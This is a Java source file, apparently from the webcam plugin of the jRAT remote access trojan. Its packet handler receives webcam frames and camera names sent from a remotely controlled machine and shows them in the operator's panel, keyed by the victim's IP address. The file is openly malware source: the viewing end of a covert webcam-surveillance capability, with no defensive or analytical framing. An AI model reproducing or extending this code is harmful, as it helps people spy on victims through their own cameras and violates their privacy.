package se.jrat.plugin.webcam.client;

import java.awt.Graphics;
import java.awt.image.BufferedImage;

import jrat.api.Client;
import jrat.api.net.PacketListener;

public class Packet120Webcam extends PacketListener {

	@Override
	public void perform(Client client) {
		String name = readString(event.getServer().getDataReader());

		PanelWebcam panel = (PanelWebcam) WebcamPlugin.entry.instances.get(event.getServer().getIP());
		
		if (name.equals("DISABLED")) {
			WebcamPlugin.enabled = false;

			if (panel != null) {
				panel.setNoWebcamFound();
			}
		} else {
			int size = event.getServer().getDataReader().readInt();
			byte[] buffer = new byte[size];
			event.getServer().getDataReader().readFully(buffer, 0, buffer.length);
			
			if (panel != null) {
				panel.setCamName(name);

				BufferedImage image = ImageUtils.decodeImage(buffer);

				Graphics g = panel.image.getGraphics();
				g.drawImage(image, 0, 0, panel.image.getWidth(), panel.image.getHeight(), null);

				panel.lbl.repaint();
			}
		}		
	}

}
